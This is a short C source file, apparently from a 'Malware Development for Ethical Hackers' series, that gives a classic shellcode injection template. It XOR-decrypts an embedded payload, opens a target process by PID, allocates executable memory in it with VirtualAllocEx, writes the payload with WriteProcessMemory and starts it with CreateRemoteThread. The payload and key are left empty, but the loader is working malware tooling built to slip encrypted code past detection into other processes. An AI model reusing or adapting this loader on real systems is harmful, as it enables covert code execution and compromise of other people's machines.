/*
 * Malware Development for Ethical Hackers
 * temp.c
 * clasic payload injection template
 * author: @cocomelonc
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

// Payload
unsigned char encryptedPayload[] = { };
char decryptionKey[] = "";

// Decryption
void decryptPayload(char * data, size_t dataLength, char * decryptionKey, size_t keyLength) {
  int keyIndex = 0;
  for (int dataIndex = 0; dataIndex < dataLength; dataIndex++) {
    if (keyIndex == keyLength - 1) keyIndex = 0;
    data[dataIndex] = data[dataIndex] ^ decryptionKey[keyIndex];
    keyIndex++;
  }
}

int main(int argc, char* argv[]) {
  HANDLE processHandle; // Process handle
  HANDLE remoteThread;  // Remote thread
  PVOID remoteBuffer;   // Remote buffer

  // Parse process ID
  printf("PID: %i", atoi(argv[1]));
  processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

  // Decrypt payload
  decryptPayload((char *)encryptedPayload, sizeof(encryptedPayload), decryptionKey, sizeof(decryptionKey));

  // Allocate memory buffer for remote process
  remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof(encryptedPayload), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

  // "Copy" data between processes
  WriteProcessMemory(processHandle, remoteBuffer, encryptedPayload, sizeof(encryptedPayload), NULL);

  // Our process starts a new thread
  remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
  CloseHandle(processHandle);
  return 0;
}
